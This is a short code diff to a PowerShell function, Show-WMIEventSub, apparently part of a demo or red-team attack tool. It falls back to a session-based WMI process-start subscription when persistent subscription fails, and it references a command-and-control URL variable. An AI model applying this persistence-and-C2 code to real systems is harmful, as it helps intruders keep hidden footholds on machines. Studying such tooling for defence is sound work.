@@ -565,8 +565,8 @@ function Show-WMIEventSub {
             Write-Warning "    [!] Class-based persistent creation failed: $errMsg"
             Write-Host "    [*] Attempting session-based (non-persistent) fallback using Register-CimIndicationEvent/Register-WmiEvent." -ForegroundColor Yellow
 
-            # Prepare session-based fallback variables
-            $query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'"
+            # Prepare session-based fallback variables (use Win32_ProcessStartTrace for reliability)
+            $query = "SELECT * FROM Win32_ProcessStartTrace"
             $source = "DemoWmi_$($Global:UniqueId)"
             $c2Url = $Global:C2Url
             $sid = $Global:UniqueId
